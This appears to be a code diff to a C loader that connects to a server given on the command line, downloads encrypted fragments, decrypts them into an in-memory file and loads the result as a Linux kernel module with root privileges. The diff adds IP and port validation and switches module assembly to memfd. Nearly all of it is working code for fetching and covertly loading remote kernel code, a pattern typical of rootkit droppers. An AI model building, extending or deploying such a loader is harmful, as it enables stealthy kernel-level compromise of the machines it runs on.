@@ -1,3 +1,5 @@
+#include <arpa/inet.h>
+#include <limits.h>
 #include <openssl/evp.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -10,10 +12,6 @@
 #include "../include/sock.h"
 #include "../include/utils.h"
 
-/* server address */
-#define SERVER_IP "127.0.0.1"
-#define SERVER_PORT "8000"
-
 static void cleanup_fraction_array(fraction_t *array, int n_elem) {
   for (int i = 0; i < n_elem; i++) {
     fraction_free(&array[i]);
@@ -21,18 +19,18 @@ static void cleanup_fraction_array(fraction_t *array, int n_elem) {
   free(array);
 }
 
-static int do_connect(void) {
+static int do_connect(char *ip_address, char *port) {
   struct addrinfo hints, *ainfo;
   int sfd;
 
   setup_hints(&hints);
 
-  if (h_getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &ainfo) != 0) {
+  if (h_getaddrinfo(ip_address, port, &hints, &ainfo) != 0) {
     log_error("Failed to resolve server address");
     return -1;
   }
 
-  printf("Connecting to: %s:%s\n", SERVER_IP, SERVER_PORT);
+  printf("Connecting to: %s:%s\n", ip_address, port);
   sfd = create_sock_and_conn(ainfo);
   if (sfd == -1) {
     log_error("Failed to create socket and connect");
@@ -100,10 +98,7 @@ static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
   http_res_t http_fraction_res = {0};
 
   fraction_t *fractions = NULL;
-  char fraction_url[50];
   int i, num_fractions;
-
-  snprintf(fraction_url, 50, "http://%s:%s/stream", SERVER_IP, SERVER_PORT);
 
   if (http_get(sfd, "/size", &http_fraction_res) != HTTP_SUCCESS) {
     log_error("Failed to retrieve fraction links");
@@ -120,12 +115,11 @@ static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
     http_free(&http_fraction_res);
     return NULL;
   }
-  
-  i = 0;
-  while (i < num_fractions) {
+
+  for (i = 0; i < num_fractions; i++) {
     log_debug("Downloading fraction no.%d", i);
 
-    if (download_fraction(sfd, fraction_url, &fractions[i]) != 0) {
+    if (download_fraction(sfd, &fractions[i]) != 0) {
       log_error("Failed to download fraction");
 
       // we have to cleanup only until i because the other fractions have not
@@ -134,8 +128,6 @@ static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
       cleanup_fraction_array(fractions, i);
       return NULL;
     }
-
-    i++;
   }
 
   http_free(&http_fraction_res);
@@ -143,22 +135,69 @@ static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
   return fractions;
 }
 
-int main(void) {
+static bool validate_ip(const char *ip) {
+  struct in_addr addr;
+
+  if (inet_pton(AF_INET, ip, &addr) != 1) {
+    return false;
+  }
+
+  return true;
+}
+
+static bool validate_port(const char *port) {
+  long portl;
+
+  errno = 0;
+
+  portl = strtol(port, NULL, 10);
+
+  if (errno != 0)
+    return false;
+  if (portl < 0 || portl > USHRT_MAX)
+    return false;
+
+  return true;
+}
+
+int main(int argc, char **argv) {
+
+  char *ip_address;
+  char *port;
+
   int sfd = -1; // to be extra professional
+  int memfd = -1;
 
   unsigned char *aes_key = NULL;
   size_t key_len = 0;
 
-  fraction_t *fractions;
+  fraction_t *fractions = NULL;
   int fraction_count;
 
-  uint8_t *module = NULL;
-  ssize_t module_size;
+  if (argc != 3) {
+    log_error("Usage: %s IP PORT", argv[0]);
+    goto cleanup;
+  }
+
+  ip_address = argv[1];
+  port = argv[2];
+
+  // validate IP and port
+  if (!validate_ip(ip_address)) {
+    log_error("Invalid IP, format as %%d.%%d.%%d.%%d");
+    goto cleanup;
+  }
+
+  if (!validate_port(port)) {
+    log_error("Invalid port, should be a number in the range (0-%d)",
+              USHRT_MAX);
+    goto cleanup;
+  }
 
   /* We need root permissions to load LKMs */
   if (geteuid() != 0) {
     log_error("This program needs to be run as root!");
-    exit(1);
+    goto cleanup;
   }
 
   /* initialize PRNG and set logging level */
@@ -166,7 +205,7 @@ int main(void) {
   log_set_level(LOG_DEBUG);
 
   /* open a connection to the server */
-  sfd = do_connect();
+  sfd = do_connect(ip_address, port);
   if (sfd < 0) {
     goto cleanup;
   }
@@ -186,35 +225,37 @@ int main(void) {
   log_info("Downloaded fractions");
 
   /* decrypt the fractions and assemble the LKM */
-  module = decrypt_lkm(fractions, fraction_count, &module_size, aes_key);
-  if (module == NULL) {
-    log_error("There was an error creating the module");
+
+  memfd = decrypt_lkm(fractions, fraction_count, aes_key);
+  if (memfd < 0) {
+    log_error("There was an error decrypting the module");
     cleanup_fraction_array(fractions, fraction_count);
     goto cleanup;
   }
 
-  /* load the LKM in the kernel */
-  if (load_lkm(module, module_size) < 0) {
-    log_error("Error loading LKM");
+  if (load_lkm(memfd) == -1) {
+    log_error("Failed to load LKM");
     goto cleanup;
   }
 
   /* cleanup */
   close(sfd);
+  close(memfd);
   cleanup_fraction_array(fractions, fraction_count);
-  free(module);
   free(aes_key);
 
   return EXIT_SUCCESS; // hooray!!!
 
   /* Encapsulate cleanup */
 cleanup:
-  if (sfd != -1) close(sfd);
-  if (fractions) cleanup_fraction_array(fractions, fraction_count);
+  if (sfd >= 0)
+    close(sfd);
+  if (memfd >= 0)
+    close(memfd);
+  if (fractions)
+    cleanup_fraction_array(fractions, fraction_count);
 
-  free(module);
   free(aes_key);
 
   return EXIT_FAILURE;
-
 }
